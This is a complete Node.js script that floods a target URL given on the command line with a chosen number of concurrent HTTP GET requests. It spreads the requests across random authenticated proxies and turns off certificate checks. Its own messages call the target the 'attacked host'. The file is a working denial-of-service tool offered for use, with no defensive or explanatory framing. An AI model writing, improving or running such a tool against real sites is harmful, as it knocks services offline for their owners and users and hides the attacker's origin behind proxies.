const https = require('https');
const axios = require('axios');
// const axios = require('axios-https-proxy-fix');


const logger = require('./logger');
const proxies = require('./proxies.json');
const [host, amount] = process.argv.slice(2, process.argv.length);

const { DEFAULT_REQUEST_TIMEOUT, USE_PROXY } = require('./constants');

const getRandomProxy = (items) => {
    if (!items || !Array.isArray(items)) {
        throw new Error(`Given broken proxies list. Expected array instead given - ${typeof items}`)
    }
    let index = 0;
    while (index === 0 || index > items.length) {
        index = Math.floor(Math.random() * proxies.length);
    }
    return proxies[index];
}

const perform = async (url, calls) => {
    if (!url && !calls) {
        throw new Error('Host and amount params does not provided.');
    }

    if (!url.match(/http|https/)) {
        console.log({
            url,
            match: url.match('/http|https/')
        });
        throw new Error('Attacked host should start with http or https');
    }
    try {
        for (let i = 0; i < calls; i++) {
            const requestOptions = {
                timeout: DEFAULT_REQUEST_TIMEOUT,
                validateStatus: () => true,
                httpsAgent: new https.Agent({
                    rejectUnauthorized: false
                })

            };
            if (USE_PROXY) {
                const proxy = getRandomProxy(proxies);
                const [proxyIP, proxyPort] = proxy.ip.split(':');
                const [proxyUsername, proxyPassword] = proxy.auth.split(':');
                requestOptions.proxy = {
                    host: proxyIP,
                    port: proxyPort,
                    auth: {
                        username: proxyUsername,
                        password: proxyPassword
                    }
                }
            }
            axios.get(url, requestOptions)
                .then((data) => logger.info(`Successfully request to - ${url}`))
                .catch((e) => {
                    logger.error(`Failed getting request to - ${url} because of error - ${e.message}`)
                })
        }
    } catch (error) {
        logger.error(`Attack failed with error - ${error.message}`);
    }
}

perform(host, amount);

